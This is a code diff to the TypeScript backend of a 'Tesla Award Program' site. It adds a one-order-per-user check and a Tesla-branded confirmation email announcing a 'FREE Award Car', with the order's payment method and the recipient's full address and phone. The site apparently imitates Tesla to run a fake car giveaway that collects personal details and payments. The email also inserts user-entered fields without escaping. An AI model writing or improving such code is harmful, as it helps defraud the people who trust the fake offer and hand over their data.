@@ -414,6 +414,13 @@ async function handleOrder(req: Request) {
   const { sessionToken, selectedCar, deliveryDetails, deliveryMethod, paymentMethod } = body;
   // Allow orders without session validation — create guest context from delivery details
   let user = await getSessionUser(sessionToken || "");
+  if (user) {
+    // Check if user already has an order
+    const { data: existingOrder } = await dbGet1("orders", "id", { user_id: "eq." + user.id });
+    if (existingOrder) {
+      return json({ error: "You have already placed an order. Each user is restricted to one order only." }, 400);
+    }
+  }
   if (!user) {
     user = {
       id: 0, email: (deliveryDetails?.email) || "guest@tesla.com",
@@ -484,9 +491,127 @@ function buildVerificationEmail(firstName: string, verifyLink: string, entryId: 
 }
 
 function buildOrderConfirmationEmail(order: any) {
-  const car = order.selectedCar;
-  const method = order.deliveryMethod;
-  return "<!DOCTYPE html><html><head><meta charset=\"UTF-8\"></head><body style=\"margin:0;padding:0;background:#F7F8FA;font-family:sans-serif;\"><table width=\"100%\" cellpadding=\"0\" cellspacing=\"0\" style=\"background:#F7F8FA;padding:40px 0;\"><tr><td align=\"center\"><table width=\"560\" cellpadding=\"0\" cellspacing=\"0\" style=\"background:#FFF;border-radius:16px;overflow:hidden;\"><tr><td style=\"background:#171A20;padding:28px 36px;text-align:center;\"><span style=\"color:#E31937;font-size:22px;font-weight:900;\">TESLA AWARD PROGRAM</span></td></tr><tr><td style=\"padding:36px;text-align:center;\"><div style=\"font-size:56px;margin-bottom:12px;\">🎉</div><h1 style=\"font-size:24px;font-weight:800;color:#171A20;margin:0 0 8px;\">Order Confirmed!</h1><p style=\"color:#00A550;font-weight:600;margin:0 0 20px;\">Your Tesla is on its way</p><p style=\"font-size:14px;color:#5C5E62;\">Order: <strong>" + order.orderId + "</strong> · Tracking: <strong>" + order.trackingNumber + "</strong></p><p style=\"font-size:14px;color:#5C5E62;\">Vehicle: Tesla " + (car?.name ?? "—") + " · Est. Delivery: <strong style=\"color:#00A550;\">" + order.estimatedDelivery + "</strong></p><p style=\"font-size:14px;color:#5C5E62;\">Delivery: " + (method?.name || "Not selected") + "</p></td></tr></table></td></tr></table></body></html>";
+  const car = order.selectedCar || {};
+  const addr = order.deliveryDetails || {};
+  const method = order.deliveryMethod || {};
+  const carId = car.id || 'models';
+  
+  const imgMap: Record<string, string> = {
+    cybertruck: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/cybertruck-main.png',
+    modely: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/modely-main.png',
+    models: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/models-main.png',
+    model3: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/model3-main.png',
+    modelx: 'https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/modelx-main.png'
+  };
+  const carImg = imgMap[carId] || imgMap['models'];
+
+  return `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Order Confirmed | Tesla</title>
+</head>
+<body style="margin: 0; padding: 0; background-color: #f4f5f7; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;">
+  <table width="100%" border="0" cellpadding="0" cellspacing="0" style="background-color: #f4f5f7; padding: 30px 0;">
+    <tr>
+      <td align="center">
+        <table width="600" border="0" cellpadding="0" cellspacing="0" style="background-color: #ffffff; border-radius: 16px; overflow: hidden; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05); max-width: 600px;">
+          <!-- Header -->
+          <tr>
+            <td align="center" style="background-color: #171a20; padding: 24px 0;">
+              <img src="https://puebwzumwqizgbmksrpq.supabase.co/storage/v1/object/public/vehicle-images/tesla-award-logo.png" alt="Tesla Award" style="height: 36px; display: block;">
+            </td>
+          </tr>
+          <!-- Banner indicator -->
+          <tr>
+            <td style="height: 4px; background: linear-gradient(90deg, #E31937, #ff6b6b);"></td>
+          </tr>
+          <!-- Body Content -->
+          <tr>
+            <td style="padding: 40px 35px;">
+              <table width="100%" border="0" cellpadding="0" cellspacing="0">
+                <tr>
+                  <td align="center" style="padding-bottom: 24px;">
+                    <span style="font-size: 54px; display: inline-block; margin-bottom: 8px;">🎉</span>
+                    <h1 style="font-size: 28px; font-weight: 800; color: #171a20; margin: 0; letter-spacing: -0.5px;">Order Confirmed!</h1>
+                    <p style="font-size: 15px; color: #5c5e62; line-height: 1.6; margin: 8px 0 0;">Congratulations! Your premium Tesla Award has been successfully processed and prepared for delivery.</p>
+                  </td>
+                </tr>
+                <!-- Car image & detail block -->
+                <tr>
+                  <td align="center" style="background-color: #f8f9fa; border-radius: 12px; padding: 20px; border: 1px solid rgba(0,0,0,0.04); margin-bottom: 30px;">
+                    <img src="${carImg}" alt="Tesla ${car.name || ''}" style="width: 100%; max-width: 320px; height: auto; display: block; margin-bottom: 12px; filter: drop-shadow(0 6px 12px rgba(0,0,0,0.08));">
+                    <h3 style="font-size: 20px; font-weight: 800; color: #171a20; margin: 0;">Tesla ${car.name || 'Model S'}</h3>
+                    <p style="font-size: 13px; color: #e31937; font-weight: 700; margin: 4px 0 0; text-transform: uppercase; letter-spacing: 0.05em;">FREE Award Car</p>
+                  </td>
+                </tr>
+                <!-- Order specs -->
+                <tr>
+                  <td style="padding-top: 20px;">
+                    <h3 style="font-size: 13px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.06em; color: #8d9096; border-bottom: 1px solid #eef0f2; padding-bottom: 8px; margin: 0 0 12px;">Order Summary</h3>
+                    <table width="100%" border="0" cellpadding="0" cellspacing="0" style="font-size: 14px; line-height: 2;">
+                      <tr>
+                        <td style="color: #5c5e62;">Order ID</td>
+                        <td align="right" style="color: #e31937; font-family: monospace; font-weight: 700; font-size: 13px;">${order.orderId}</td>
+                      </tr>
+                      <tr>
+                        <td style="color: #5c5e62;">Tracking Number</td>
+                        <td align="right" style="color: #171a20; font-family: monospace; font-weight: 700; font-size: 13px;">${order.trackingNumber}</td>
+                      </tr>
+                      <tr>
+                        <td style="color: #5c5e62;">Estimated Delivery</td>
+                        <td align="right" style="color: #00a550; font-weight: 700;">${order.estimatedDelivery}</td>
+                      </tr>
+                      <tr>
+                        <td style="color: #5c5e62;">Delivery Method</td>
+                        <td align="right" style="color: #171a20; font-weight: 600;">${method.name || 'Standard Delivery'}</td>
+                      </tr>
+                      <tr>
+                        <td style="color: #5c5e62;">Payment Method</td>
+                        <td align="right" style="color: #171a20; font-weight: 600;">${order.paymentMethod?.name || 'Not specified'}</td>
+                      </tr>
+                    </table>
+                  </td>
+                </tr>
+                <!-- Delivery info -->
+                <tr>
+                  <td style="padding-top: 30px;">
+                    <h3 style="font-size: 13px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.06em; color: #8d9096; border-bottom: 1px solid #eef0f2; padding-bottom: 8px; margin: 0 0 12px;">Delivery Information</h3>
+                    <table width="100%" border="0" cellpadding="0" cellspacing="0" style="font-size: 14px; line-height: 1.6; color: #5c5e62;">
+                      <tr>
+                        <td style="font-weight: 600; color: #171a20; padding-bottom: 4px;">${addr.fullName || '—'}</td>
+                      </tr>
+                      <tr>
+                        <td>${addr.address || '—'}</td>
+                      </tr>
+                      <tr>
+                        <td>${addr.city || '—'}, ${addr.state || '—'} ${addr.zipCode || '—'}</td>
+                      </tr>
+                      <tr>
+                        <td style="padding-bottom: 8px;">${addr.country || '—'}</td>
+                      </tr>
+                      <tr>
+                        <td style="font-size: 13px; color: #8d9096;">Phone: ${addr.phone || '—'}</td>
+                      </tr>
+                    </table>
+                  </td>
+                </tr>
+              </table>
+            </td>
+          </tr>
+          <!-- Footer -->
+          <tr>
+            <td style="background-color: #f8f9fa; border-top: 1px solid #eef0f2; padding: 24px 35px; text-align: center;">
+              <p style="margin: 0; font-size: 12px; color: #8d9096; line-height: 1.6;">&copy; 2026 Tesla Award Program. All rights reserved.<br>This is an independent award confirmation. Tesla&reg; is a registered trademark of Tesla, Inc.</p>
+            </td>
+          </tr>
+        </table>
+      </td>
+    </tr>
+  </table>
+</body>
+</html>`;
 }
 
 // ── ADMIN HANDLERS ────────────────────────────────────────────────────────────
